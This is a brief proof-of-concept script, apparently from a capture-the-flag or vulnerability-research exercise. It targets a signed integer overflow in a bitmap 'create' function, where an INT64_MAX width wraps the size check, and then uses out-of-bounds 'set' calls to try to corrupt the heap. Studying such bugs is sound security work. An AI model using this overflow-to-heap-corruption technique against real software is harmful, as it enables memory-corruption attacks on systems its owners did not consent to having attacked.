# EXPLOIT: Bitmap Create Signed Integer Overflow
#
# CONFIRMED: create(9223372036854775807, 2) PASSES the bounds check!
#
# The vulnerability:
# - Line 6: a2 * a1 > 0x800000 check
# - INT64_MAX * 2 overflows to -2 (negative)
# - Negative is NOT > 0x800000, so check passes incorrectly
# - malloc allocates tiny buffer (malloc(0) = minimum chunk)
# - But width = INT64_MAX, height = 2
# - set() operations can overflow index calculation â†’ heap corruption!

# Step 1: Create bitmap with overflowed dimensions
bitmap b1 = create(9223372036854775807, 2);

# Step 2: Test normal access (should work)
set(b1, 0, 0, 1);
int val1 = get(b1, 0, 0);
print(val1);

# Step 3: Test with y=1 (might trigger index overflow)
set(b1, 0, 1, 1);
int val2 = get(b1, 0, 1);
print(val2);

# Step 4: Try to trigger heap corruption with larger coordinates
# The index calculation: y * width + x
# With width = INT64_MAX, even small y values cause overflow
# y=1: index = 1 * INT64_MAX = INT64_MAX (might be out of bounds of tiny buffer)
# y=2: index = 2 * INT64_MAX = overflows again!

print("Exploit test completed");

